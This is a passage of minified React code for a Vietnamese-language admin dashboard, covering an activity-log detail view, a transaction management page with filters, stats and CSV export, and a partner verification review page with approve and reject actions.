text-gray-600",children:j.resource_type}),j.resource_id&&e.jsxs("span",{className:"text-xs text-gray-400",children:["#",j.resource_id]})]})}),e.jsx(H,{children:e.jsx("div",{className:"text-sm text-gray-600 max-w-xs truncate",children:j.details||"-"})}),e.jsx(H,{children:e.jsx("span",{className:"text-xs font-mono text-gray-600",children:j.ip_address||"-"})}),e.jsx(H,{className:"text-right",children:e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>x(j),children:[e.jsx($e,{className:"h-4 w-4 mr-1"}),"Xem"]})})]},j.id)})})]})})})}),m&&m.pages>1&&e.jsx("div",{className:"mt-6 flex justify-center",children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(C,{variant:"outline",onClick:()=>i({...r,page:r.page-1}),disabled:r.page===1,children:"Trước"}),e.jsxs("span",{className:"text-sm text-gray-600 px-4",children:["Trang ",r.page," / ",m.pages," (Tổng: ",m.total," bản ghi)"]}),e.jsx(C,{variant:"outline",onClick:()=>i({...r,page:r.page+1}),disabled:r.page===m.pages,children:"Sau"})]})}),c&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50",children:e.jsxs("div",{className:"bg-white rounded-lg max-w-2xl w-full p-6",children:[e.jsxs("div",{className:"flex justify-between items-center mb-6",children:[e.jsx("h2",{className:"text-2xl font-bold text-gray-900",children:"Chi tiết Activity Log"}),e.jsx(C,{variant:"outline",onClick:()=>x(null),children:"Đóng"})]}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Thời gian"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:ue(c.created_at)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Người dùng"}),e.jsxs("p",{className:"text-sm text-gray-900 mt-1",children:[((z=c.user)==null?void 0:z.username)||`User #${c.user_id}`,((G=c.user)==null?void 0:G.email)&&e.jsxs("span",{className:"text-gray-600",children:[" (",c.user.email,")"]})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Action"}),e.jsxs("div",{className:"flex items-center gap-2 mt-1",children:[u(c.action),e.jsx($,{className:D(c.action),children:c.action})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Resource Type"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:c.resource_type})]}),c.resource_id&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Resource ID"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:c.resource_id})]}),c.details&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Chi tiết"}),e.jsx("pre",{className:"text-sm text-gray-900 mt-1 p-3 bg-gray-50 rounded-lg overflow-auto",children:typeof c.details=="string"?c.details:JSON.stringify(c.details,null,2)})]}),c.ip_address&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"IP Address"}),e.jsx("p",{className:"text-sm font-mono text-gray-900 mt-1",children:c.ip_address})]}),c.user_agent&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"User Agent"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1 break-all",children:c.user_agent})]})]})]})})]})}function bi(){const[n,t]=d.useState([]),[s,a]=d.useState(null),[r,i]=d.useState(!0),[c,x]=d.useState(null),[l,y]=d.useState(null),[f,b]=d.useState(""),[o,p]=d.useState(""),[g,h]=d.useState(""),[m,B]=d.useState(""),[P,S]=d.useState(""),[O,V]=d.useState(1),[v,I]=d.useState(1),[u,D]=d.useState(0),z=20,G=async()=>{try{const A=new URLSearchParams({page:O.toString(),limit:z.toString(),...f&&{search:f},...o&&{status:o},...g&&{type:g},...m&&{date_from:m},...P&&{date_to:P}}),[w,X]=await Promise.all([Q.apiRequest(`/admin/transactions?${A.toString()}`),Q.apiRequest("/admin/transactions/stats").then(ne=>(ne==null?void 0:ne.data)??ne)]);t(w.items||[]),I(w.pages||1),D(w.total||0),a(X)}catch(A){x(A instanceof Error?A.message:"Unknown error")}finally{i(!1)}};d.useEffect(()=>{G()},[O,f,o,g,m,P]);const j=A=>{b(A),V(1)},W=A=>{p(A==="all"?"":A),V(1)},U=A=>{h(A==="all"?"":A),V(1)},J=async()=>{try{const A=Q.getToken(),w=new URLSearchParams({...f&&{search:f},...o&&{status:o},...g&&{type:g},...m&&{date_from:m},...P&&{date_to:P},format:"csv"}),X=await fetch(`/api/admin/transactions/export?${w.toString()}`,{headers:{Authorization:`Bearer ${A}`}});if(X.ok){const ne=await X.blob(),te=window.URL.createObjectURL(ne),oe=document.createElement("a");oe.href=te,oe.download=`transactions_${new Date().toISOString().split("T")[0]}.csv`,document.body.appendChild(oe),oe.click(),window.URL.revokeObjectURL(te),document.body.removeChild(oe)}}catch(A){console.error("Export failed:",A)}},q=A=>{const w={pending:{label:"Chờ xử lý",variant:"secondary",className:"bg-yellow-100 text-yellow-800"},completed:{label:"Hoàn thành",variant:"secondary",className:"bg-green-100 text-green-800"},failed:{label:"Thất bại",variant:"secondary",className:"bg-red-100 text-red-800"},cancelled:{label:"Đã hủy",variant:"secondary",className:"bg-gray-100 text-gray-800"}},X=w[A]||w.pending;return e.jsx($,{variant:X.variant,className:X.className,children:X.label})},T=A=>{const w={payment:{label:"Thanh toán",className:"bg-blue-100 text-blue-800"},refund:{label:"Hoàn tiền",className:"bg-purple-100 text-purple-800"},withdrawal:{label:"Rút tiền",className:"bg-orange-100 text-orange-800"}},X=w[A]||w.payment;return e.jsx($,{variant:"secondary",className:X.className,children:X.label})},E=A=>new Intl.NumberFormat("vi-VN",{style:"currency",currency:"VND"}).format(A),N=A=>new Date(A).toLocaleString("vi-VN");return r?e.jsx("div",{className:"flex items-center justify-center h-64",children:e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"})}):c?e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4",children:[e.jsxs("p",{className:"text-red-600",children:["Error: ",c]}),e.jsx(C,{onClick:G,className:"mt-2",children:"Thử lại"})]})}):e.jsxs("div",{className:"p-6 space-y-6",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Quản lý giao dịch"}),e.jsx("p",{className:"text-gray-600",children:"Theo dõi và quản lý tất cả giao dịch trong hệ thống"})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsxs(C,{variant:"outline",onClick:G,className:"flex items-center gap-2",children:[e.jsx(ye,{className:"h-4 w-4"}),"Làm mới"]}),e.jsxs(C,{onClick:J,className:"flex items-center gap-2",children:[e.jsx(Ee,{className:"h-4 w-4"}),"Xuất dữ liệu"]})]})]}),s&&e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-4",children:[e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng giao dịch"}),e.jsx(kt,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:s.total_count.toLocaleString()}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:["Tổng giá trị: ",E(s.total_amount)]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Hoàn thành"}),e.jsx(ot,{className:"h-4 w-4 text-green-500"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold text-green-600",children:s.completed_count.toLocaleString()}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:[(s.completed_count/s.total_count*100).toFixed(1),"% tổng số"]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Chờ xử lý"}),e.jsx(Te,{className:"h-4 w-4 text-yellow-500"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold text-yellow-600",children:s.pending_count.toLocaleString()}),e.jsx("p",{className:"text-xs text-muted-foreground",children:"Cần xử lý ngay"})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tỷ lệ thành công"}),e.jsx(ot,{className:"h-4 w-4 text-blue-500"})]}),e.jsxs(_,{children:[e.jsxs("div",{className:"text-2xl font-bold text-blue-600",children:[s.total_count>0?(s.completed_count/s.total_count*100).toFixed(1):0,"%"]}),e.jsx("p",{className:"text-xs text-muted-foreground",children:"Tỷ lệ giao dịch thành công"})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(_t,{className:"h-5 w-5"}),"Bộ lọc tìm kiếm"]})}),e.jsx(_,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4",children:[e.jsxs("div",{className:"relative",children:[e.jsx(He,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),e.jsx(se,{placeholder:"Tìm theo ID, mô tả...",value:f,onChange:A=>j(A.target.value),className:"pl-10"})]}),e.jsxs(ce,{value:o||"all",onValueChange:W,children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Trạng thái"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"Tất cả trạng thái"}),e.jsx(R,{value:"pending",children:"Chờ xử lý"}),e.jsx(R,{value:"completed",children:"Hoàn thành"}),e.jsx(R,{value:"failed",children:"Thất bại"}),e.jsx(R,{value:"cancelled",children:"Đã hủy"})]})]}),e.jsxs(ce,{value:g||"all",onValueChange:U,children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Loại giao dịch"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"Tất cả loại"}),e.jsx(R,{value:"payment",children:"Thanh toán"}),e.jsx(R,{value:"refund",children:"Hoàn tiền"}),e.jsx(R,{value:"withdrawal",children:"Rút tiền"})]})]}),e.jsxs("div",{className:"flex gap-2",children:[e.jsx(se,{type:"date",value:m,onChange:A=>B(A.target.value),placeholder:"Từ ngày"}),e.jsx(se,{type:"date",value:P,onChange:A=>S(A.target.value),placeholder:"Đến ngày"})]})]})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{children:["Danh sách giao dịch (",u.toLocaleString()," kết quả)"]})}),e.jsxs(_,{children:[e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{children:"ID"}),e.jsx(K,{children:"Đối tác"}),e.jsx(K,{children:"Loại"}),e.jsx(K,{children:"Số tiền"}),e.jsx(K,{children:"Trạng thái"}),e.jsx(K,{children:"Ngày tạo"}),e.jsx(K,{children:"Thao tác"})]})}),e.jsx(De,{children:n.length>0?n.map(A=>e.jsxs(he,{children:[e.jsxs(H,{className:"font-mono text-sm",children:["#",A.id]}),e.jsx(H,{children:e.jsxs("div",{children:[e.jsxs("p",{className:"font-medium",children:["Partner #",A.partner_id]}),e.jsx("p",{className:"text-sm text-gray-500",children:A.reference_id})]})}),e.jsx(H,{children:T(A.transaction_type)}),e.jsx(H,{className:"font-medium",children:E(A.amount)}),e.jsx(H,{children:q(A.status)}),e.jsx(H,{className:"text-sm",children:N(A.created_at)}),e.jsx(H,{children:e.jsx(C,{variant:"outline",size:"sm",onClick:()=>y(A),children:e.jsx($e,{className:"h-4 w-4"})})})]},A.id)):e.jsx(he,{children:e.jsx(H,{colSpan:7,className:"text-center py-8 text-gray-500",children:"Không tìm thấy giao dịch nào"})})})]}),v>1&&e.jsxs("div",{className:"flex items-center justify-between mt-4",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>V(A=>Math.max(1,A-1)),disabled:O===1,children:[e.jsx(nn,{className:"h-4 w-4"}),"Trước"]}),e.jsxs("span",{className:"text-sm text-gray-600",children:["Trang ",O," / ",v]}),e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>V(A=>Math.min(v,A+1)),disabled:O===v,children:["Sau",e.jsx(an,{className:"h-4 w-4"})]})]}),e.jsxs("div",{className:"text-sm text-gray-600",children:["Hiển thị ",Math.min(z,u)," / ",u," kết quả"]})]})]})]}),l&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50",children:e.jsxs(k,{className:"w-full max-w-2xl mx-4 max-h-[90vh] overflow-y-auto",children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center justify-between",children:["Chi tiết giao dịch #",l.id,e.jsx(C,{variant:"outline",size:"sm",onClick:()=>y(null),children:"✕"})]})}),e.jsx(_,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"ID giao dịch"}),e.jsx("p",{className:"font-mono text-sm",children:l.id})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Mã tham chiếu"}),e.jsx("p",{className:"font-mono text-sm",children:l.reference_id})]})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Đối tác"}),e.jsxs("p",{children:["Partner #",l.partner_id]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Loại giao dịch"}),T(l.transaction_type)]})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Số tiền"}),e.jsx("p",{className:"text-lg font-bold",children:E(l.amount)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Trạng thái"}),q(l.status)]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Mô tả"}),e.jsx("p",{className:"mt-1 p-3 bg-gray-50 rounded-lg",children:l.description||"Không có mô tả"})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Ngày tạo"}),e.jsx("p",{children:N(l.created_at)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Cập nhật lần cuối"}),e.jsx("p",{children:N(l.updated_at)})]})]})]})})]})})]})}function Ni(){const[n,t]=d.useState([]),[s,a]=d.useState(null),[r,i]=d.useState(!0),[c,x]=d.useState(null),[l,y]=d.useState(null),[f,b]=d.useState(""),[o,p]=d.useState(""),[g,h]=d.useState(""),[m,B]=d.useState(1),[P,S]=d.useState(1),[O,V]=d.useState(0),v=20,[I,u]=d.useState(null),[D,z]=d.useState(""),G=async()=>{try{const q=new URLSearchParams({page:m.toString(),limit:v.toString(),...f&&{search:f},...o&&{status:o},...g&&{email_type:g}}),[T,E]=await Promise.all([Q.apiRequest(`/admin/verifications?${q.toString()}`),Q.apiRequest("/admin/verifications/stats")]);t(T.items||[]),S(T.pages||1),V(T.total||0),a(E)}catch(q){x(q instanceof Error?q.message:"Unknown error")}finally{i(!1)}};d.useEffect(()=>{G()},[m,f,o,g]);const j=async(q,T)=>{try{u(q),await Q.apiRequest(`/admin/verifications/${q}/status`,{method:"PUT",body:JSON.stringify({status:T,notes:D})}),await G(),z(""),alert("Cập nhật trạng thái thành công!")}catch(E){alert("Lỗi cập nhật trạng thái: "+(E instanceof Error?E.message:"Unknown error"))}finally{u(null)}},W=q=>{const T={pending:{label:"Chờ xử lý",className:"bg-yellow-100 text-yellow-800"},under_review:{label:"Đang xem xét",className:"bg-blue-100 text-blue-800"},approved:{label:"Đã duyệt",className:"bg-green-100 text-green-800"},rejected:{label:"Từ chối",className:"bg-red-100 text-red-800"}},E=T[q]||T.pending;return e.jsx($,{variant:"secondary",className:E.className,children:E.label})},U=q=>{const T={business:{label:"Doanh nghiệp",className:"bg-blue-100 text-blue-800"},personal:{label:"Cá nhân",className:"bg-green-100 text-green-800"}},E=T[q]||T.business;return e.jsx($,{variant:"secondary",className:E.className,children:E.label})},J=q=>new Date(q).toLocaleString("vi-VN");return r?e.jsx("div",{className:"flex items-center justify-center h-64",children:e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"})}):c?e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4",children:[e.jsxs("p",{className:"text-red-600",children:["Error: ",c]}),e.jsx(C,{onClick:G,className:"mt-2",children:"Thử lại"})]})}):e.jsxs("div",{className:"p-6 space-y-6",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Quản lý xác minh tài khoản"}),e.jsx("p",{className:"text-gray-600",children:"Xem xét và phê duyệt các yêu cầu xác minh từ đối tác"})]}),e.jsxs(C,{onClick:G,className:"flex items-center gap-2",children:[e.jsx(Ue,{className:"h-4 w-4"}),"Làm mới"]})]}),s&&e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-5 gap-4",children:[e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng cộng"}),e.jsx(Ue,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsx(_,{children:e.jsx("div",{className:"text-2xl font-bold",children:s.total_count.toLocaleString()})})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Chờ xử lý"}),e.jsx(rn,{className:"h-4 w-4 text-yellow-500"})]}),e.jsx(_,{children:e.jsx("div",{className:"text-2xl font-bold text-yellow-600",children:s.pending_count.toLocaleString()})})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Đang xem xét"}),e.jsx(Le,{className:"h-4 w-4 text-blue-500"})]}),e.jsx(_,{children:e.jsx("div",{className:"text-2xl font-bold text-blue-600",children:s.under_review_count.toLocaleString()})})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Đã duyệt"}),e.jsx(ge,{className:"h-4 w-4 text-green-500"})]}),e.jsx(_,{children:e.jsx("div",{className:"text-2xl font-bold text-green-600",children:s.approved_count.toLocaleString()})})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Từ chối"}),e.jsx(Ne,{className:"h-4 w-4 text-red-500"})]}),e.jsx(_,{children:e.jsx("div",{className:"text-2xl font-bold text-red-600",children:s.rejected_count.toLocaleString()})})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(_t,{className:"h-5 w-5"}),"Bộ lọc tìm kiếm"]})}),e.jsx(_,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[e.jsxs("div",{className:"relative",children:[e.jsx(He,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),e.jsx(se,{placeholder:"Tìm theo mã xác minh, email...",value:f,onChange:q=>b(q.target.value),className:"pl-10"})]}),e.jsxs(ce,{value:o||"all",onValueChange:q=>p(q==="all"?"":q),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Trạng thái"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"Tất cả trạng thái"}),e.jsx(R,{value:"pending",children:"Chờ xử lý"}),e.jsx(R,{value:"under_review",children:"Đang xem xét"}),e.jsx(R,{value:"approved",children:"Đã duyệt"}),e.jsx(R,{value:"rejected",children:"Từ chối"})]})]}),e.jsxs(ce,{value:g||"all",onValueChange:q=>h(q==="all"?"":q),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Loại email"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"Tất cả loại"}),e.jsx(R,{value:"business",children:"Doanh nghiệp"}),e.jsx(R,{value:"personal",children:"Cá nhân"})]})]})]})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{children:["Danh sách xác minh (",O.toLocaleString()," kết quả)"]})}),e.jsxs(_,{children:[e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{children:"ID"}),e.jsx(K,{children:"Đối tác"}),e.jsx(K,{children:"Loại email"}),e.jsx(K,{children:"Mã xác minh"}),e.jsx(K,{children:"Trạng thái"}),e.jsx(K,{children:"Ngày tạo"}),e.jsx(K,{children:"Thao tác"})]})}),e.jsx(De,{children:n.length>0?n.map(q=>e.jsxs(he,{children:[e.jsxs(H,{className:"font-mono text-sm",children:["#",q.id]}),e.jsx(H,{children:e.jsxs("div",{children:[e.jsxs("p",{className:"font-medium",children:["Partner #",q.partner_id]}),q.partner&&e.jsx("p",{className:"text-sm text-gray-500",children:q.partner.business_name})]})}),e.jsx(H,{children:U(q.email_type)}),e.jsx(H,{className:"font-mono text-sm",children:q.verification_code}),e.jsx(H,{children:W(q.status)}),e.jsx(H,{className:"text-sm",children:J(q.created_at)}),e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(C,{variant:"outline",size:"sm",onClick:()=>y(q),children:e.jsx($e,{className:"h-4 w-4"})}),q.status==="pending"&&e.jsxs("div",{className:"flex gap-1",children:[e.jsx(C,{variant:"outline",size:"sm",onClick:()=>j(q.id,"approved"),disabled:I===q.id,className:"text-green-600 hover:text-green-700",children:e.jsx(ge,{className:"h-4 w-4"})}),e.jsx(C,{variant:"outline",size:"sm",onClick:()=>j(q.id,"rejected"),disabled:I===q.id,className:"text-red-600 hover:text-red-700",children:e.jsx(Ne,{className:"h-4 w-4"})})]})]})})]},q.id)):e.jsx(he,{children:e.jsx(H,{colSpan:7,className:"text-center py-8 text-gray-500",children:"Không tìm thấy yêu cầu xác minh nào"})})})]}),P>1&&e.jsxs("div",{className:"flex items-center justify-between mt-4",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>B(q=>Math.max(1,q-1)),disabled:m===1,children:[e.jsx(nn,{className:"h-4 w-4"}),"Trước"]}),e.jsxs("span",{className:"text-sm text-gray-600",children:["Trang ",m," / ",P]}),e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>B(q=>Math.min(P,q+1)),disabled:m===P,children:["Sau",e.jsx(an,{className:"h-4 w-4"})]})]}),e.jsxs("div",{className:"text-sm text-gray-600",children:["Hiển thị ",Math.min(v,O)," / ",O," kết quả"]})]})]})]}),l&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50",children:e.jsxs(k,{className:"w-full max-w-2xl mx-4 max-h-[90vh] overflow-y-auto",children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center justify-between",children:["Chi tiết xác minh #",l.id,e.jsx(C,{variant:"outline",size:"sm",onClick:()=>y(null),children:"✕"})]})}),e.jsx(_,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"ID xác minh"}),e.jsx("p",{className:"font-mono text-sm",children:l.id})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Mã xác minh"}),e.jsx("p",{className:"font-mono text-sm",children:l.verification_code})]})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Đối tác"}),e.jsxs("p",{children:["Partner #",l.partner_id]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Loại email"}),U(l.email_type)]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Trạng thái"}),e.jsx("div",{className:"mt-1",children:W(l.status)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Thông tin bổ sung"}),e.jsx("p",{className:"mt-1 p-3 bg-gray-50 rounded-lg",children:l.additional_info||"Không có thông tin bổ sung"})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Ngày tạo"}),e.jsx("p",{children:J(l.created_at)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Cập nhật lần cuối"}),e.jsx("p",{children:J(l.updated_at)})]})]}),l.status==="pending"&&e.jsxs("div",{className:"border-t pt-4",children:[e.jsx("label",{className:"text-sm font-medium text-gray-700",children:"Ghi chú (tùy chọn)"}),e.jsx("textarea",{className:"w-full mt-2 p-3 border border-gray-300 rounded-lg",rows:3,value:D,onChange:q=>z(q.target.value),placeholder:"Nhập ghi chú cho quyết định của bạn..."}),e.jsxs("div",{className:"flex gap-3 mt-4",children:[e.jsxs(C,{onClick:()=>j(l.id,"approved"),disabled:I===l.id,className:"flex-1 bg-green-600 hover:bg-green-700",children:[e.jsx(ge,{className:"h-4 w-4 mr-2"}),"Phê duyệt"]}),e.jsxs(C,{onClick:()=>j(l.id,"rejected"),disabled:I===l.id,variant:"destructive",className:"flex-1",children:[e.jsx(Ne,{className:"h-4 w-4 mr-2"}),"Từ chối"]})]})]})]})})]})})]})}const wi=()=>{var T;const[n,t]=d.useState(""),[s,a]=d.useState("all"),[r,i]=d.useState("all"),[c,x]=d.useState("all"),[l,y]=d.useState(1),[f,b]=d.useState(10),{toast:o}=Se();qe();const[p,g]=d.useState(!1),{data:h,isLoading:m,isError:B,refetch:P}=me({queryKey:["partners",l,f,s,r,c,n],queryFn:async()=>{const E={};s!=="all"&&(E.status=s),r!=="all"&&(E.businessType=r),c!=="all"&&(E.industry=c),n&&(E.search=n);const N=new URLSearchParams({page:l.toString(),limit:f.toString(),...Object.fromEntries(Object.entries(E).map(([A,w])=>[A,(w==null?void 0:w.toString())||""]))});return Q.apiRequest(`/admin/partners?${N}`)},staleTime:3e4}),{data:S,isError:O}=me({queryKey:["partner-stats"],queryFn:async()=>Q.apiRequest("/admin/partners/stats"),staleTime:6e4});d.useEffect(()=>{(B||O)&&g(!0)},[B,O]);const V=h,v=S,I=mt(E=>{t(E),y(1)},500),u=E=>{I(E.target.value)},D=(E,N)=>{switch(E){case"status":a(N);break;case"businessType":i(N);break;case"industry":x(N);break}y(1)},z=E=>{y(E)},G=E=>{b(E),y(1)},j=async()=>{try{if(p)return;const E=await Q.apiRequest("/admin/partners/export",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({filters:{status:s!=="all"?s:void 0,businessType:r!=="all"?r:void 0,industry:c!=="all"?c:void 0,search:n||void 0}})}),N=new Blob([E],{type:"text/csv"}),A=window.URL.createObjectURL(N),w=document.createElement("a");w.href=A,w.download=`partners-${new Date().toISOString().split("T")[0]}.csv`,document.body.appendChild(w),w.click(),window.URL.revokeObjectURL(A),document.body.removeChild(w),o({title:"Xuất dữ liệu thành công",description:"File CSV đã được tải xuống."})}catch{o({title:"Lỗi xuất dữ liệu",description:"Không thể xuất dữ liệu. Vui lòng thử lại.",variant:"destructive"})}},W=E=>{switch(E){case"active":return"bg-green-100 text-green-800";case"inactive":return"bg-gray-100 text-gray-800";case"suspended":return"bg-red-100 text-red-800";default:return"bg-gray-100 text-gray-800"}},U=E=>{switch(E){case"active":return"Hoạt động";case"inactive":return"Không hoạt động";case"suspended":return"Tạm ngừng";default:return"Không xác định"}},J=E=>{switch(E){case"individual":return"Cá nhân";case"household":return"Hộ kinh doanh";case"company":return"Công ty";case"enterprise":return"Doanh nghiệp";default:return E}},q=E=>{switch(E){case"food":return"Ăn uống";case"retail":return"Bán lẻ";case"service":return"Dịch vụ";case"technology":return"Công nghệ";case"other":return"Khác";default:return E}};return e.jsxs("div",{className:"space-y-6",children:[p&&e.jsxs("div",{className:"bg-yellow-50 border border-yellow-200 rounded-md p-4",children:[e.jsx("p",{className:"text-yellow-800 font-medium",children:"Tính năng chưa khả dụng"}),e.jsx("p",{className:"text-yellow-700 text-sm mt-1",children:"Backend chưa cung cấp endpoints /admin/partners. Các chức năng sẽ tạm ẩn/không hoạt động."})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-3xl font-bold tracking-tight",children:"Quản lý đối tác"}),e.jsx("p",{className:"text-muted-foreground",children:"Quản lý và giám sát các đối tác đã đăng ký"})]}),e.jsxs(C,{onClick:()=>P(),variant:"outline",size:"sm",children:[e.jsx(ye,{className:"h-4 w-4 mr-2"}),"Làm mới"]})]}),v&&e.jsxs("div",{className:"grid gap-4 md:grid-cols-2 lg:grid-cols-4",children:[e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng đối tác"}),e.jsx(Ve,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:v.totalPartners||0}),e.jsxs("p",{className:"text-xs 